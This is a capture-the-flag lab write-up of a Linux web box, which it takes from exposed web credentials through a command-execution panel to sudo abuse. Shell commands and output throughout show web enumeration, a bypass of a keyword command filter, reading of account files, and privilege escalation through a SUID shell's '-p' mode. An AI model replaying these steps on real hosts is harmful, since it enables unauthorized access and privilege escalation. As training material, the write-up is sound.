---
type: writeup
platform: Exegol
room: H4ck3rz
os: Linux
environment: Web Application / Linux Privilege Escalation

techniques:
  - web-enumeration
  - credential-disclosure
  - authenticated-command-execution
  - sudo-abuse
  - command-filter-bypass
  - suid-enumeration
  - binary-analysis
  - suid-abuse

tools:
  - nmap
  - curl
  - gobuster
  - sudo
  - findmnt
  - objdump
  - strings
---
**Attack path:** Web enumeration → exposed web credentials → authenticated Shell Panel → RCE as `www-data` → unrestricted sudo as `titouan` → custom SUID shell analysis → privileged `-p` mode → root effective UID

## 1. Reconnaissance

Initial service enumeration:

```bash
sudo nmap -sV -sC -oA exegol1 <TARGET_IP>
```

Relevant services:

```bash
22/tcp open  ssh   OpenSSH 10.0p2 Debian
80/tcp open  http  Apache/2.4.68 (Debian)
```

Nmap also detected a `robots.txt` entry:

```bash
/1337_53CR37_l41r
```

A full TCP scan confirmed that only ports `22` and `80` were exposed:

```bash
sudo nmap -p- -T4 -oA exegol1-allports <TARGET_IP>
```

The HTTP service therefore became the primary attack surface.

---

## 2. Hidden Web Content and Credential Disclosure

The `robots.txt` file was retrieved:

```bash
curl -i http://<TARGET_IP>/robots.txt
```

Relevant response:

```bash
User-agent: *
Disallow: /1337_53CR37_l41r
```

The disclosed directory was then inspected:

```bash
curl -i http://<TARGET_IP>/1337_53CR37_l41r/
```

Additional web enumeration was performed with Gobuster:

```bash
gobuster dir \
  -u http://<TARGET_IP>/ \
  -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```

The hidden directory was also enumerated:

```bash
gobuster dir \
  -u http://<TARGET_IP>/1337_53CR37_l41r \
  -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt
```

A search including common file extensions revealed:

```bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w ~/work/Pentest/Wordlist/SecLists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,zip
```

Relevant resources included:

```bash
/assets
/index.html
/login.php
/portal.php
/robots.txt
```

The preserved notes record that web enumeration exposed credentials:

```bash
Username: d4rk_T1t0u4N
Password: <REDACTED>
```

The credentials were first tested against SSH, but authentication failed.

This was an important distinction: discovering credentials does not establish where they are valid.

Because the web application exposed `login.php`, the same credentials were tested there next.

---

## 3. Web Authentication

The login form used:

```html
<input name="username">
<input name="password">
<input name="sub">
```

The recovered credentials were submitted:

```bash
curl -i \
  -c cookies.txt \
  -d 'username=d4rk_T1t0u4N&password=<REDACTED>&sub=Login' \
  http://<TARGET_IP>/login.php
```

The application returned:

```http
HTTP/1.1 302 Found
Location: /portal.php
```

This confirmed that the credentials were valid for the web application.

The authenticated session was then reused:

```bash
curl -i \
  -b cookies.txt \
  http://<TARGET_IP>/portal.php
```

Response:

```http
HTTP/1.1 200 OK
```

The portal exposed a **Shell Panel** that accepted operating-system commands.

---

## 4. Authenticated Command Execution

The Shell Panel used a POST parameter named:

```bash
command
```

Command execution was validated with:

```bash
curl \
  -b cookies.txt \
  --data-urlencode 'command=id' \
  --data-urlencode 'sub=Execute' \
  http://<TARGET_IP>/portal.php
```

Result:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed authenticated remote command execution as:

```bash
www-data
```

The current working directory was:

```bash
/var/www/html
```

The compromise had therefore crossed from web authentication into operating-system command execution.

---

## 5. Local Enumeration as `www-data`

The web root was enumerated:

```bash
ls -la /var/www/html
```

Relevant files included:

```bash
1337_53CR37_l41r/
assets/
forbidden.php
index.html
login.php
portal.php
robots.txt
```

The application filtered the literal command:

```bash
cat /etc/passwd
```

so another legitimate system utility was used to enumerate accounts:

```bash
getent passwd
```

A local user was identified:

```bash
titouan:x:1000:1000::/home/titouan:/bin/bash
```

SUID files were also enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

No immediately unusual SUID binary was identified at this point.

The next significant finding came from sudo.

---

## 6. `www-data` → `titouan` Through Sudo

Sudo permissions available to `www-data` were checked:

```bash
sudo -l
```

Result:

```bash
User www-data may run the following commands on h4xx0r_pc:

    (titouan) NOPASSWD: ALL
```

This granted `www-data` the ability to execute **any command as `titouan` without a password**.

The identity transition was verified directly:

```bash
sudo -u titouan id
```

Result:

```bash
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

The user's home directory was then inspected:

```bash
sudo -u titouan ls -la /home/titouan
```

Relevant files:

```bash
-rwsrwsrwt 1 root    root    ... 42sh
-r-------- 1 titouan titouan ... user.txt
```

The `user.txt` file was readable only by `titouan`.

Because the web application's command filter blocked `cat`, the flag was read with `sed` instead:

```bash
sudo -u titouan sed -n '1p' /home/titouan/user.txt
```

```bash
EPI{REDACTED}
```

This demonstrated an important weakness in keyword-based command filtering: blocking a specific utility does not prevent the underlying operation when equivalent tools remain available.

---

## 7. Enumerating From the `titouan` Context

The next question was whether `titouan` had a direct sudo path to root.

The following was executed from the existing `www-data` context while impersonating `titouan`:

```bash
sudo -u titouan sudo -n -l 2>&1
```

Result:

```bash
sudo: a password is required
```

There was therefore no demonstrated passwordless sudo transition from `titouan` to root.

Attention returned to the unusual file previously observed in the user's home directory:

```bash
/home/titouan/42sh
```

Its permissions were:

```bash
-rwsrwsrwt 1 root root ... 42sh
```

The binary was owned by `root` and had the SUID bit set, making it a strong privilege-escalation candidate.

---

## 8. Verifying That SUID Was Effective

A SUID bit has no effect when the underlying filesystem is mounted with `nosuid`.

The filesystem containing `42sh` was therefore checked:

```bash
sudo -u titouan \
  findmnt -T /home/titouan/42sh -o TARGET,FSTYPE,OPTIONS -n
```

The resulting mount options did **not** include:

```bash
nosuid
```

The filesystem therefore allowed SUID execution.

This established that the SUID bit was technically usable, but not yet that the binary preserved root privileges.

---

## 9. Initial `42sh` Execution

The binary was first executed normally:

```bash
echo 'id' | sudo -u titouan /home/titouan/42sh
```

Result:

```bash
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

Despite being root-owned and SUID, normal execution did not preserve an effective UID of `0`.

A direct attempt to read the root flag also failed:

```bash
echo "sed -n '1p' < /root/root.txt" | \
  sudo -u titouan /home/titouan/42sh 2>&1
```

Result:

```bash
/home/titouan/42sh: line 1: /root/root.txt: Permission denied
```

At this point, the evidence showed:

```text
SUID bit present
+
filesystem allows SUID
+
default execution does not provide root access
```

The binary therefore required further analysis rather than assuming that SUID alone made it exploitable.

---

## 10. Eliminating Shell Redirection as the Cause

The previous command used input redirection:

```bash
< /root/root.txt
```

To determine whether the failure came from unsupported shell syntax or insufficient privileges, the same technique was tested against a readable file:

```bash
echo "sed -n '1p' < /etc/passwd" | \
  sudo -u titouan /home/titouan/42sh
```

Result:

```bash
root:x:0:0:root:/root:/bin/bash
```

Input redirection worked correctly.

The failure against `/root/root.txt` was therefore caused by the process lacking sufficient privileges in its default mode.

---

## 11. Retrieving the Custom Binary for Analysis

The custom shell was copied for local analysis.

Because `www-data` could not directly traverse `/home/titouan`, the file was first copied as `titouan`:

```bash
sudo -u titouan cp /home/titouan/42sh /tmp/42sh.bin
```

The copied file was checked:

```bash
ls -lh /tmp/42sh.bin
```

```bash
-rwxrwxr-x 1 titouan titouan ... /tmp/42sh.bin
```

It was then moved into a web-accessible directory:

```bash
cp /tmp/42sh.bin /var/www/html/assets/42sh.bin
```

and downloaded to the attacker machine:

```bash
curl -f \
  http://<TARGET_IP>/assets/42sh.bin \
  -o 42sh.bin
```

File identification showed:

```bash
file 42sh.bin
```

```bash
ELF 64-bit LSB pie executable, x86-64,
dynamically linked, stripped
```

The local copy was used only for analysis; exploitation later targeted the original root-owned SUID binary.

---

## 12. Static Analysis of `42sh`

Dynamic symbols associated with identity changes and process execution were inspected:

```bash
objdump -T 42sh.bin | grep -Ei \
  'setuid|seteuid|setreuid|setresuid|getuid|geteuid|execve|execvp|system|popen'
```

Relevant symbols included:

```bash
setresuid
getuid
geteuid
execve
shell_execve
```

This indicated that the shell explicitly handled process execution and user IDs.

Strings inside the binary were then searched for privilege-related functionality:

```bash
strings -a 42sh.bin | grep -i -A3 -B3 privileged
```

A significant option was discovered:

```bash
privileged   same as -p
```

This suggested that `42sh` supported a dedicated privileged mode.

Rather than assuming how the mode behaved, it was tested against the original SUID binary.

---

## 13. SUID Privileged Mode → Root

The shell was executed again with:

```bash
-p
```

```bash
echo 'id' | \
  sudo -u titouan /home/titouan/42sh -p
```

Result:

```bash
uid=1000(titouan) gid=1000(titouan) euid=0(root) egid=0(root) groups=0(root),1000(titouan)
```

This confirmed successful privilege escalation.

The real UID remained:

```bash
titouan
```

but the effective UID became:

```bash
root
```

The crucial transition was therefore:

```text
root-owned SUID 42sh
        +
privileged mode (-p)
        ↓
effective UID 0
```

Unlike the normal execution path, `-p` preserved the binary's privileged effective identity.

---

## 14. Reading the Root Flag

The privileged shell was finally used to read the root-only flag:

```bash
echo "sed -n '1p' /root/root.txt" | \
  sudo -u titouan /home/titouan/42sh -p
```

Result:

```bash
EPI{REDACTED}
```

Root-level file access was therefore confirmed through:

```bash
euid=0(root)
```

---

## Key Takeaways

- `robots.txt` should be treated as an enumeration source, not as an access-control mechanism; disallowed paths remain directly accessible unless protected separately.
- Discovered credentials must be validated against the relevant service. The exposed credentials failed over SSH but succeeded against the web application.
- An authenticated administrative feature that directly executes operating-system commands is effectively an RCE primitive.
- Keyword-based command filtering does not provide meaningful protection when equivalent utilities can perform the same operation.
- `(titouan) NOPASSWD: ALL` created a complete identity transition from `www-data` to `titouan`, but it did not itself provide root privileges.
- The presence of a SUID bit should be validated against filesystem mount options and actual runtime behavior before concluding that escalation is possible.
- A failed SUID execution attempt can provide useful evidence: here it showed that `42sh` dropped or did not preserve root privileges in its default mode.
- Static analysis with `objdump` and `strings` exposed the binary's privilege-handling functionality and revealed its `-p` privileged mode.
- For SUID exploitation, the effective UID is what demonstrated privileged execution: `euid=0(root)` confirmed that `42sh -p` executed commands with root authority.